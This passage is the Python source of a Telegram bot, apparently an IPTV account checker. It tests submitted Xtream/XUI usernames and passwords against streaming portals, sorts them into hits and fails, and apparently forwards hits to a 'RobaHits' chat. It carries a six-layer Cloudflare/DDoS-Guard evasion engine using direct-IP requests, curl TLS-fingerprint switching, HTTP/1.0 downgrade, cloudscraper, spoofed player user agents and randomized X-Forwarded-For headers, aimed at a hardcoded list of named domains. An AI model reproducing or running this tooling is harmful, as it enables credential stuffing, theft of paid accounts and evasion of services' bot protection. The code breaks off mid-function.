#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║        🦂 L U I S  R 🦂  —  IPTV BOT NIVEL DIOS         ║
║         v5.0 ULTRA ∞ GODMODE  24/7  SIN PROXIES          ║
║  6 capas CF bypass · RobaHits · DNS directo · curl/VLC   ║
╚══════════════════════════════════════════════════════════╝
"""

import os, re, json, time, threading, logging, socket, asyncio, random, pickle, traceback
from pathlib import Path
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
import pytz
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

requests.packages.urllib3.disable_warnings()

# ╔══════════════════════════════════════════════════════════╗
# ║                 ⚙️  CONFIGURACIÓN                        ║
# ║         Railway → Variables de Entorno                   ║
# ╚══════════════════════════════════════════════════════════╝
BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL      = os.getenv("RENDER_URL", "")
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")
TZ              = pytz.timezone(TZ_NAME)
BOT_USERNAME    = "@Luishits_bot"

if not ROBAHITS_CHATID and ADMIN_ID:
    ROBAHITS_CHATID = str(ADMIN_ID)

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ── Estado global ──────────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}

# ── Decoraciones ───────────────────────────────────────────
LINE_THICK = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
LINE_THIN  = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
CROWN      = "👑"
SKULL      = "🦂"
STAR       = "⭐"
FIRE       = "🔥"
DIAMOND    = "💎"
BOLT       = "⚡"
SHIELD     = "🛡️"
GLOBE      = "🌐"
LOCK       = "🔐"
KEY        = "🗝️"
CALENDAR   = "📅"
CLOCK      = "🕐"
SIGNAL     = "📡"
LIVE       = "📺"
MOVIE      = "🎬"
SERIES     = "🎭"
CHECK      = "✅"
CROSS      = "❌"
WARN       = "⚠️"
ARROW      = "➤"
GEM        = "🔮"
ROCKET     = "🚀"
TROPHY     = "🏆"

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

# ── Timeouts — subidos según petición ─────────────────────
TCP_TIMEOUT   = 4
CONN_TIMEOUT  = 8
READ_TIMEOUT  = 15   # ← subido a 15s
TOTAL_TIMEOUT = 35   # ← más margen total
M3U_RETRIES   = 2    # ← reintentos para listas M3U
M3U_RETRY_WAIT = 2   # ← segundos entre reintento

# ── User-Agents — VLC 3.0.20 primero (más compatible M3U) ─
ALL_USER_AGENTS = [
    "VLC/3.0.20 LibVLC/3.0.20",              # ← PRIMERO siempre
    "VLC/3.0.21 LibVLC/3.0.21",
    "VLC/3.0.18 LibVLC/3.0.18",
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "TiviMate/4.4.0 (Android 11)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "VLC/3.0.21 LibVLC/3.0.21",
    "VLC/3.0.18 LibVLC/3.0.18",
    "okhttp/4.9.0",
    "GSE SMART IPTV/7.4 (Android 11)",
    "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
    "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
    "SS_IPTV/3.9.0 (SmartTV)",
    "curl/7.88.1",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/5.0 TV Safari/538.1",
]

# ── Dominios CF / DDoS-Guard conocidos ────────────────────
CF_DOMAINS = [
    'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
    'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
    'titanxtv.com','venusiptv.com','latinchannel.tv','etvhosts.site',
]

# ── Clasificación de puertos ───────────────────────────────
HTTPS_PORTS = {"443","8443","2053","2083","2087","2096","8888"}
HTTP_PORTS  = {"80","8080","8000","8008","25461","2082","2086","55337"}

# ── Respuestas de error en texto plano ─────────────────────
PLAIN_ERRORS = {
    "PLAYLIST_DISABLED": "Lista deshabilitada",
    "ACCOUNT_EXPIRED":   "Cuenta expirada",
    "ACCOUNT_BANNED":    "Cuenta bloqueada",
    "USER_NOT_FOUND":    "Usuario no encontrado",
    "INVALID_PASS":      "Contraseña incorrecta",
    "ACCOUNT_DISABLED":  "Cuenta deshabilitada",
    "TRIAL_EXPIRED":     "Trial expirado",
}

# ── Cookies Cloudflare persistentes ───────────────────────
COOKIES_DIR = Path("cf_cookies")
COOKIES_DIR.mkdir(exist_ok=True)

# ── Pool de threads ────────────────────────────────────────
_EXECUTOR = ThreadPoolExecutor(max_workers=20)

# ╔══════════════════════════════════════════════════════════╗
# ║                   🕐 UTILIDADES                          ║
# ╚══════════════════════════════════════════════════════════╝

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

def flag_from_code(code: str) -> str:
    f = FLAGS.get(code, "")
    if not f and len(code) == 2:
        pts = [ord(c) + 127397 for c in code.upper()]
        f = chr(pts[0]) + chr(pts[1])
    return f

# ╔══════════════════════════════════════════════════════════╗
# ║             🔧 PROTOCOLO / URL DETECTION                 ║
# ╚══════════════════════════════════════════════════════════╝

def _port_to_scheme(port_str: str, default: str = "http") -> str:
    if port_str in HTTPS_PORTS:
        return "https"
    if port_str in HTTP_PORTS:
        return "http"
    return default

def _schemes_for_portal(portal: str):
    port_str = portal.split(":")[1] if ":" in portal else "8080"
    primary = _port_to_scheme(port_str)
    alt     = "https" if primary == "http" else "http"
    return primary, alt

# ╔══════════════════════════════════════════════════════════╗
# ║             🔍 EXTRACCIÓN DE URL — Universal             ║
# ╚══════════════════════════════════════════════════════════╝

def extract_from_url(text: str):
    text = text.strip().replace("\r","").replace("%3A",":").replace("%2F","/")

    # XUI One / MAC playlist
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?&]+)',
        text, re.IGNORECASE)
    if m:
        portal = m.group(1)
        user   = m.group(2)
        pwd    = m.group(3).split('?')[0].split('&')[0].strip()
        return portal, user, pwd, True

    # Xtream estándar
    patterns = [
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            portal = m.group(1)
            user   = m.group(2)
            pwd    = m.group(3)
            for bad in ("&type=","&output=","&format=","\n"," "):
                pwd = pwd.split(bad)[0]
            pwd = pwd.split('&')[0].split('?')[0].strip()
            return portal, user, pwd, False

    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2], False

    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2], False

    return None, None, None, False

# ╔══════════════════════════════════════════════════════════╗
# ║              🍪 COOKIES CLOUDFLARE                       ║
# ╚══════════════════════════════════════════════════════════╝

def _cookie_path(host: str) -> Path:
    return COOKIES_DIR / f"{host.split(':')[0].replace('.','_')}.pkl"

def _save_cookies(session, host: str):
    try:
        with open(_cookie_path(host), 'wb') as f:
            pickle.dump(dict(session.cookies), f)
    except Exception:
        pass

def _load_cookies(session, host: str):
    try:
        p = _cookie_path(host)
        if p.exists() and (time.time() - p.stat().st_mtime) < 3600:
            with open(p, 'rb') as f:
                session.cookies.update(pickle.load(f))
    except Exception:
        pass

def _is_cf(host: str) -> bool:
    h = host.lower().split(':')[0]
    return any(d in h for d in CF_DOMAINS)

# ╔══════════════════════════════════════════════════════════╗
# ║           📡 SESIÓN HTTP — Rápida sin delays             ║
# ╚══════════════════════════════════════════════════════════╝

_UA_CYCLE = 0
_UA_LOCK  = threading.Lock()

def _next_ua() -> str:
    global _UA_CYCLE
    with _UA_LOCK:
        ua = ALL_USER_AGENTS[_UA_CYCLE % len(ALL_USER_AGENTS)]
        _UA_CYCLE += 1
        return ua

def _quick_session(host: str = "", vlc_first: bool = True) -> requests.Session:
    s = requests.Session()
    s.mount("http://",  HTTPAdapter(max_retries=0))
    s.mount("https://", HTTPAdapter(max_retries=0))
    if host:
        _load_cookies(s, host)
    # VLC 3.0.20 es el UA de mayor compatibilidad con servidores M3U
    ua = "VLC/3.0.20 LibVLC/3.0.20" if vlc_first else _next_ua()
    s.headers.update({
        "User-Agent":      ua,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "close",
        "Cache-Control":   "no-cache",
    })
    return s

# ╔══════════════════════════════════════════════════════════╗
# ║    🛡️  BYPASS CF/DDOS NIVEL DIOS — SIN PROXIES DE PAGO  ║
# ║  5 capas: DNS directo · VLC headers · curl · HTTP/1.0   ║
# ╚══════════════════════════════════════════════════════════╝

def _is_cf_blocked(text: str) -> bool:
    """Detecta si la respuesta es una página de bloqueo CF/DDoS."""
    if not text or len(text) < 10:
        return False
    low = text.lower()
    return any(k in low for k in (
        "cloudflare", "just a moment", "recaptcha", "ddos-guard",
        "attention required", "checking your browser", "enable javascript",
        "challenge-platform", "ray id", "cf-ray",
    ))

def _resolve_real_ip(host: str) -> str:
    """
    TÉCNICA 1 — DNS directo: resuelve la IP real del servidor IPTV.
    Muchos servidores IPTV están detrás de CF solo para el dominio,
    pero su API responde directamente por IP sin pasar por CF.
    """
    try:
        ip = socket.gethostbyname(host.split(":")[0])
        log.info(f"[dns] {host} → IP real: {ip}")
        return ip
    except Exception:
        return ""

def _url_via_ip(url: str, host: str, real_ip: str) -> str:
    """Construye URL usando IP directa en lugar del dominio."""
    if not real_ip or real_ip == host.split(":")[0]:
        return url
    port = host.split(":")[1] if ":" in host else "8080"
    return url.replace(host.split(":")[0], real_ip, 1)

def _cf_curl(url: str, host: str, timeout: int = 15):
    """
    TÉCNICA 2 — curl del sistema: usa TLS fingerprint diferente a Python.
    CF bloquea por JA3/JA4 fingerprint; curl tiene otro fingerprint
    que muchos servidores no bloquean aunque bloqueen requests/urllib3.
    """
    import subprocess
    try:
        cmd = [
            "curl", "-s", "-L",
            "--max-time", str(timeout),
            "--insecure",                     # verify=False equivalente
            "-A", "VLC/3.0.20 LibVLC/3.0.20", # UA: VLC
            "-H", "Accept: application/json, text/plain, */*",
            "-H", "Accept-Language: es-US,es;q=0.9,en;q=0.8",
            "-H", f"Host: {host.split(':')[0]}",
            "--compressed",
            url
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        if result.returncode == 0 and result.stdout.strip():
            raw = result.stdout.strip()
            if not _is_cf_blocked(raw):
                log.info(f"[curl] ✅ Respuesta válida de {host}")
                # Crear objeto tipo Response para _process()
                class FakeResponse:
                    status_code = 200
                    text = raw
                    headers = {}
                return FakeResponse()
            else:
                log.warning(f"[curl] CF sigue bloqueando {host}")
        else:
            log.warning(f"[curl] returncode={result.returncode} | stderr: {result.stderr[:60]}")
    except FileNotFoundError:
        log.debug("[curl] curl no disponible en este sistema")
    except Exception as e:
        log.debug(f"[curl] err: {e}")
    return None

def _cf_vlc_headers(url: str, host: str, timeout: int = 15):
    """
    TÉCNICA 3 — Headers exactos de VLC 3.0.20.
    VLC usa un conjunto muy específico de headers que la mayoría
    de servidores IPTV aceptan incluso con CF activo, porque
    reconocen el patrón de un reproductor real.
    """
    vlc_headers_sets = [
        # VLC estándar
        {
            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Icy-MetaData": "1",
            "Connection": "close",
        },
        # VLC con Accept-Language (más completo)
        {
            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
            "Accept": "application/json;q=0.9,*/*;q=0.8",
            "Accept-Language": "es",
            "Accept-Encoding": "gzip, deflate",
            "Range": "bytes=0-",
            "Connection": "keep-alive",
        },
        # TiviMate headers reales
        {
            "User-Agent": "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Connection": "close",
            "X-Forwarded-For": f"185.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}",
        },
        # Kodi headers reales
        {
            "User-Agent": "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "es-419",
            "Accept-Encoding": "gzip, deflate",
        },
    ]

    for hdrs in vlc_headers_sets:
        try:
            s = requests.Session()
            s.mount("http://",  HTTPAdapter(max_retries=0))
            s.mount("https://", HTTPAdapter(max_retries=0))
            _load_cookies(s, host)
            r = s.get(url, headers=hdrs, timeout=(CONN_TIMEOUT, timeout),
                      verify=False, allow_redirects=True)
            if r.status_code in (200, 206):
                raw = r.text.strip()
                if not _is_cf_blocked(raw):
                    _save_cookies(s, host)
                    log.info(f"[vlc-headers] ✅ UA: {hdrs['User-Agent'][:30]}")
                    return r
                log.debug(f"[vlc-headers] CF bloqueó con UA: {hdrs['User-Agent'][:30]}")
            elif r.status_code == 403:
                log.warning(f"[vlc-headers] 403 Forbidden con UA: {hdrs['User-Agent'][:30]}")
            elif r.status_code == 503:
                log.warning(f"[vlc-headers] 503 CF Challenge con UA: {hdrs['User-Agent'][:30]}")
        except Exception as e:
            log.debug(f"[vlc-headers] err: {e}")

    return None

def _cf_http10(url: str, host: str, timeout: int = 12):
    """
    TÉCNICA 4 — HTTP/1.0: algunos servidores CF responden sin challenge
    a peticiones HTTP/1.0 porque los challenges modernos requieren JS
    y asumen que HTTP/1.0 es un cliente legacy legítimo.
    """
    try:
        from http.client import HTTPConnection, HTTPSConnection
        parsed = urlparse(url if url.startswith("http") else "http://" + url)
        is_https = parsed.scheme == "https"
        netloc = parsed.netloc or host
        h = netloc.split(":")[0]
        p = int(netloc.split(":")[1]) if ":" in netloc else (443 if is_https else 8080)
        path = parsed.path
        if parsed.query:
            path += "?" + parsed.query

        conn = HTTPSConnection(h, p, timeout=timeout) if is_https else HTTPConnection(h, p, timeout=timeout)
        if is_https:
            import ssl
            conn = HTTPSConnection(h, p, timeout=timeout,
                                   context=ssl._create_unverified_context())
        conn.request("GET", path, headers={
            "Host": h,
            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
            "Accept": "*/*",
            "Connection": "close",
        })
        resp = conn.getresponse()
        if resp.status in (200, 206):
            raw = resp.read(1024 * 1024).decode("utf-8", errors="ignore").strip()
            conn.close()
            if not _is_cf_blocked(raw):
                log.info(f"[http1.0] ✅ Respuesta válida de {host}")
                class FakeResponse:
                    status_code = 200
                    text = raw
                    headers = {}
                return FakeResponse()
        conn.close()
    except Exception as e:
        log.debug(f"[http1.0] err: {e}")
    return None

def _cf_dns_ip_direct(url: str, host: str, timeout: int = 15):
    """
    TÉCNICA 5 — IP directa con header Host.
    Si el servidor tiene CF solo en el dominio pero no en la IP directa,
    conectar por IP con el header Host correcto puede bypassear CF.
    """
    real_ip = _resolve_real_ip(host)
    if not real_ip:
        return None
    domain = host.split(":")[0]
    port   = host.split(":")[1] if ":" in host else "8080"
    if real_ip == domain:  # No resolvió diferente
        return None
    url_via_ip = url.replace(domain, real_ip, 1)
    try:
        s = requests.Session()
        s.mount("http://",  HTTPAdapter(max_retries=0))
        s.mount("https://", HTTPAdapter(max_retries=0))
        hdrs = {
            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
            "Host": domain + (":" + port if port not in ("80","443") else ""),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
        }
        r = s.get(url_via_ip, headers=hdrs, timeout=(CONN_TIMEOUT, timeout),
                  verify=False, allow_redirects=False)
        if r.status_code in (200, 206):
            raw = r.text.strip()
            if not _is_cf_blocked(raw):
                log.info(f"[ip-direct] ✅ IP {real_ip} bypasó CF para {domain}")
                return r
            log.warning(f"[ip-direct] CF activo incluso en IP directa {real_ip}")
        elif r.status_code in (301, 302, 307, 308):
            log.info(f"[ip-direct] Redirección {r.status_code} → {r.headers.get('Location','?')[:60]}")
    except Exception as e:
        log.debug(f"[ip-direct] err: {e}")
    return None

def _cf_cloudscraper(url: str, host: str, timeout: int = 15):
    """
    TÉCNICA 6 — cloudscraper con cookies persistentes.
    Si cloudscraper ya tiene cookies válidas, las reutiliza sin challenge.
    """
    try:
        import cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "windows", "mobile": False},
            delay=2
        )
        _load_cookies(scraper, host)
        r = scraper.get(url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code in (200, 206):
            raw = r.text.strip()
            if not _is_cf_blocked(raw):
                _save_cookies(scraper, host)
                log.info(f"[cloudscraper] ✅ Bypass exitoso para {host}")
                return r
            log.warning(f"[cloudscraper] Challenge JS no resuelto para {host}")
    except ImportError:
        log.debug("[cloudscraper] No instalado — pip install cloudscraper")
    except Exception as e:
        log.warning(f"[cloudscraper] err: {e}")
    return None

def _cf_get(url: str, host: str, timeout: int = 15):
    """
    Motor principal de bypass CF — prueba las 6 técnicas en orden
    de menor a mayor costo computacional. Primera que funcione gana.

    Técnicas (GRATIS, sin proxies de pago):
    1. VLC headers exactos + rotación de UAs IPTV reales
    2. IP directa + header Host (saltarse CF en el dominio)
    3. curl del sistema (TLS fingerprint diferente a Python)
    4. HTTP/1.0 legacy (evita JS challenge)
    5. cloudscraper (si está instalado)
    """
    log.info(f"[cf-bypass] Iniciando bypass para {host} → {url[:70]}")

    # Técnica 1: VLC headers
    r = _cf_vlc_headers(url, host, timeout)
    if r:
        return r

    # Técnica 2: IP directa
    r = _cf_dns_ip_direct(url, host, timeout)
    if r:
        return r

    # Técnica 3: curl del sistema
    r = _cf_curl(url, host, timeout)
    if r:
        return r

    # Técnica 4: HTTP/1.0
    r = _cf_http10(url, host, timeout)
    if r:
        return r

    # Técnica 5: cloudscraper
    r = _cf_cloudscraper(url, host, timeout)
    if r:
        return r

    log.warning(f"[cf-bypass] ❌ Todas las técnicas fallaron para {host}")
    return None

# ╔══════════════════════════════════════════════════════════╗
# ║              🔬 ANÁLISIS DE RESPUESTA                    ║
# ╚══════════════════════════════════════════════════════════╝

def _parse_json(raw: str):
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None

def _analyze_json(data) -> tuple:
    if not isinstance(data, dict):
        return "RETRY", None
    ui = data.get("user_info") or (data if "auth" in data else None)
    if ui is None:
        return "RETRY", None
    try:
        auth = int(ui.get("auth", -1))
    except Exception:
        return "RETRY", None
    if auth == 0:
        return "FAIL", None
    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {"user_info": real_ui, "server_info": data.get("server_info", {})}
        status  = str(real_ui.get("status", "")).strip().lower()
        return ("HIT" if status == "active" else "CUSTOM"), payload
    return "RETRY", None

def _process(r) -> tuple:
    if r is None:
        return "RETRY", None
    code = r.status_code
    if code == 404:
        return "FAIL", None
    if code in (401, 403, 500, 502, 503, 504):
        return "RETRY", None
    if code not in (200, 206):
        return "RETRY", None
    try:
        raw = r.text.strip()
    except Exception:
        return "RETRY", None
    if not raw or len(raw) < 4:
        return "RETRY", None
    if raw[0] == "<":
        low = raw.lower()
        if any(k in low for k in ("cloudflare","just a moment","recaptcha","ddos","attention required")):
            return "RETRY", None
        return "RETRY", None
    upper = raw.upper()
    for key in PLAIN_ERRORS:
        if key in upper:
            return "FAIL", None
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth":1, "status":"Active", "exp_date":"0",
                "active_cons":"?", "max_connections":"?",
                "is_trial":"0", "created_at":"0",
            },
            "server_info": {}, "m3u_direct": True,
        }
    data = _parse_json(raw)
    if data is None:
        return "RETRY", None
    return _analyze_json(data)

# ╔══════════════════════════════════════════════════════════╗
# ║          ⚡ VERIFICACIÓN RÁPIDA — Una sola URL           ║
# ╚══════════════════════════════════════════════════════════╝

def _check_url(url: str, host: str, attempt: int = 0) -> tuple:
    """
    Petición individual con:
    - UA: VLC/3.0.20 (máxima compatibilidad M3U)
    - verify=False (SSL desactivado para chequeo)
    - allow_redirects=True (sigue redirecciones automáticamente)
    - Logging real del error: status, Timeout, 403, SSL Error, etc.
    """
    try:
        s = _quick_session(host, vlc_first=True)
        r = s.get(url, timeout=(CONN_TIMEOUT, READ_TIMEOUT),
                  verify=False,           # ← SSL desactivado para chequeo
                  allow_redirects=True)   # ← sigue redirecciones
        _save_cookies(s, host)
        # Log real del status code para diagnóstico
        if r.status_code not in (200, 206):
            log.warning(f"[check] HTTP {r.status_code} | {url[:70]}")
        return _process(r)
    except requests.exceptions.ConnectTimeout:
        log.warning(f"[check] ConnectTimeout (intento {attempt+1}) | {url[:70]}")
        return "RETRY", None
    except requests.exceptions.ReadTimeout:
        log.warning(f"[check] ReadTimeout {READ_TIMEOUT}s (intento {attempt+1}) | {url[:70]}")
        return "RETRY", None
    except requests.exceptions.SSLError as e:
        log.warning(f"[check] SSLError: {e} | {url[:70]}")
        # Reintenta sin verificación explícita (ya está en False, puede ser otro problema)
        return "RETRY", None
    except requests.exceptions.ConnectionError as e:
        log.warning(f"[check] ConnectionError: {str(e)[:80]} | {url[:70]}")
        return "RETRY", None
    except Exception as e:
        log.warning(f"[check] Error inesperado ({type(e).__name__}): {str(e)[:80]} | {url[:70]}")
        return "RETRY", None

# ╔══════════════════════════════════════════════════════════╗
# ║    🚀 VERIFICACIÓN COMPLETA — Paralela + Reintentos M3U  ║
# ╚══════════════════════════════════════════════════════════╝

def _check_url_with_retry(url: str, host: str) -> tuple:
    """
    Wrapper con reintentos para URLs M3U/get.php:
    - 2 reintentos con 2 segundos de pausa entre cada uno
    - Evita falsos RETRY por rate-limiting o flood-ban temporal
    """
    for attempt in range(M3U_RETRIES + 1):
        result, payload = _check_url(url, host, attempt=attempt)
        if result in ("HIT", "FAIL", "CUSTOM"):
            return result, payload
        if attempt < M3U_RETRIES:
            log.info(f"[retry] Intento {attempt+1}/{M3U_RETRIES} fallido, esperando {M3U_RETRY_WAIT}s → {url[:60]}")
            time.sleep(M3U_RETRY_WAIT)
    return "RETRY", None

def verify_account(portal: str, user: str, pwd: str, is_xui: bool = False) -> tuple:
    host    = portal.split(':')[0]
    port    = int(portal.split(':')[1]) if ':' in portal else 8080
    is_cf   = _is_cf(host)
    t_start = time.time()

    def elapsed():
        return time.time() - t_start

    def timed_out():
        return elapsed() >= TOTAL_TIMEOUT

    # Paso 1: TCP rápido
    tcp_ok = False
    for p in (port, 80, 443):
        if timed_out():
            break
        try:
            conn = socket.create_connection((host, p), timeout=TCP_TIMEOUT)
            conn.close()
            tcp_ok = True
            break
        except Exception:
            pass

    if not tcp_ok:
        log.warning(f"TCP ❌ {host} → RETRY")
        return "RETRY", None

    # Paso 2: Paralelo sin delays
    primary, alt = _schemes_for_portal(portal)
    urls: list[str] = []

    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/player_api.php?username={user}&password={pwd}")
        urls.append(f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus")
        if is_xui:
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u")

    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
        urls.append(f"{base}/get.php?username={user}&password={pwd}")

    seen = set()
    unique_urls = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            unique_urls.append(u)

    remaining = TOTAL_TIMEOUT - elapsed()
    if remaining <= 0:
        return "RETRY", None

    futures = {
        _EXECUTOR.submit(_check_url, url, host): url
        for url in unique_urls
    }

    try:
        for fut in as_completed(futures, timeout=remaining):
            try:
                result, payload = fut.result()
                if result in ("HIT", "FAIL", "CUSTOM"):
                    for f in futures:
                        f.cancel()
                    log.info(f"✅ {result} en {elapsed():.1f}s | {futures[fut][:60]}")
                    return result, payload
            except Exception as e:
                log.debug(f"future err: {e}")
    except Exception:
        pass

    # Paso 3: Bypass CF
    if is_cf and not timed_out():
        log.info(f"🛡️ CF bypass para {host}")
        for scheme in (primary, alt):
            if timed_out():
                break
            for endpoint in (
                f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}",
                f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
            ):
                if timed_out():
                    break
                r   = _cf_get(endpoint, host, timeout=10)
                res, pay = _process(r)
                if res != "RETRY":
                    log.info(f"✅ CF bypass {res} en {elapsed():.1f}s")
                    return res, pay

    # Paso 4: Fallback get.php básico — con reintentos M3U
    if not timed_out():
        for scheme in (primary, alt):
            if timed_out():
                break
            url = f"{scheme}://{portal}/get.php?username={user}&password={pwd}"
            log.info(f"[fallback] Intentando get.php básico con reintentos: {url[:70]}")
            res, pay = _check_url_with_retry(url, host)
            if res != "RETRY":
                return res, pay

    log.info(f"⚠️ RETRY {host} — {elapsed():.1f}s agotados")
    return "RETRY", "Sin respuesta JSON válida — servidor sin API estándar o bloqueado por CF"

# ╔══════════════════════════════════════════════════════════╗
# ║        📊 CONTEO DE CONTENIDO — Paralelo streaming       ║
# ╚══════════════════════════════════════════════════════════╝

def _count_json_objects(url: str, timeout_s: int = 10) -> str:
    try:
        s = _quick_session()
        resp = s.get(url, timeout=(CONN_TIMEOUT, timeout_s),
                     verify=False, stream=True)
        if resp.status_code != 200:
            resp.close()
            return ""
        depth = count = 0
        in_str = esc = started = False
        max_bytes = 20 * 1024 * 1024
        read = 0
        for chunk in resp.iter_content(chunk_size=65536):
            if not chunk:
                continue
            read += len(chunk)
            for ch in chunk.decode("utf-8", errors="ignore"):
                if esc:
                    esc = False; continue
                if ch == "\\" and in_str:
                    esc = True; continue
                if ch == '"':
                    in_str = not in_str; continue
                if in_str:
                    continue
                if ch == '[' and not started and depth == 0:
                    started = True; continue
                if not started:
                    continue
                if ch == '{':
                    depth += 1
                    if depth == 1:
                        count += 1
                elif ch == '}':
                    depth -= 1
                elif ch == ']' and depth == 0:
                    resp.close()
                    return str(count)
            if read >= max_bytes:
                resp.close()
                return str(count) if count else ""
        resp.close()
        return str(count) if count else ""
    except Exception:
        return ""

def _count_list(url: str, timeout_s: int = 8) -> str:
    try:
        s = _quick_session()
        r = s.get(url, timeout=(CONN_TIMEOUT, timeout_s), verify=False)
        if r.status_code == 200:
            d = r.json()
            if isinstance(d, list):
                return str(len(d))
    except Exception:
        pass
    return ""

def get_content_counts(portal: str, user: str, pwd: str) -> tuple:
    base = f"http://{portal}"
    urls = {
        "live": f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
        "vod":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_streams",
        "ser":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_series",
        "vc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_categories",
